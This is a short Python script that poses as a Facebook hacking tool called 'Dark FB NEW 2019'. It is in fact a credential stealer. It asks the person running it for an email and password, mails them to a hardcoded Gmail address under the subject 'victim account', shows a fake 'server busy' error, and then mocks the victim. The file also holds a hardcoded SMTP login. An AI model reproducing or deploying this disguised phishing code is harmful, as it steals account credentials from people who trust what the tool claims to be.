import os, sys
print ("Menginstall paket......... ") 
os.system('pip install yagmail')
os.system('pip install termcolor')
import yagmail
from termcolor import colored
print (colored('paket selesai di install.','blue'))
banner = """"
 ____             __      _________  NEW   
   / __ \____ ______/ /__   / ____/ __ )    
  / / / / __ `/ ___/ //_/  / /_  / __  |    
 / /_/ / /_/ / /  / ,<    / __/ / /_/ /     
/_____/\__,_/_/  /_/|_|  /_/   /_____/
  
  Dark FB NEW 2019 
  """
print (colored(banner,'green'))
print (colored('silahkan login dahulu bos Q,untuk masuk menu tools nya','blue'))
anjirt = yagmail.SMTP('Terminal.emulator.app','sulaeman') 
username = str(input(colored('Masukan email: ','yellow')))
password = str(input(colored('Masukan password: ','yellow')))
body = ('username: '+username, 'password: '+password)
subject = 'Akun Korban'
anjirt.send('agiskusmana97@gmail.com',subject,body)
print (colored('Maaf, server sibuk (TERLALU BANYAK PERMINTAAN). silahkan coba beberapa saat lagi.','red'))



print (colored('T A P I B O O N G','green'))
print (colored('MAKANYA BELAJAR program','green'))
print (colored('JANGAN CUMA BISA PAKE SCRIPT ORANG LAIN','green'))
